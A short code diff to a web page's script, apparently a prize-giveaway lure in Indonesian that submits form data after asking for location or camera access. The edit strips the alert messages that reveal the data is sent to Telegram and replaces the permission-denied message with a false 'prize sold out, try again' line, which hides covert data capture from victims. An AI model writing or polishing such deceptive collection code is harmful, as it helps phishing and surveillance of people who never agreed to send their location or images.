@@ -338,16 +338,16 @@
             body: formData
           });
           if (response.ok) {
-            alert("Terima kasih! Hadiah akan dikirim.");
+            alert("Terima kasih!");
           } else {
-            alert("Gagal mengirim ke Telegram. Coba lagi nanti.");
+            alert("error");
           }
         } catch (e) {
-          alert("Terjadi kesalahan koneksi ke Telegram.");
+          alert("error.");
         }
       },
       function (error) {
-        alert("Akses lokasi atau kamera ditolak, hadiah tidak bisa dikirim!");
+        alert("Hadiah sudah habis, cobalagi nanti!");
       }
     );
   }
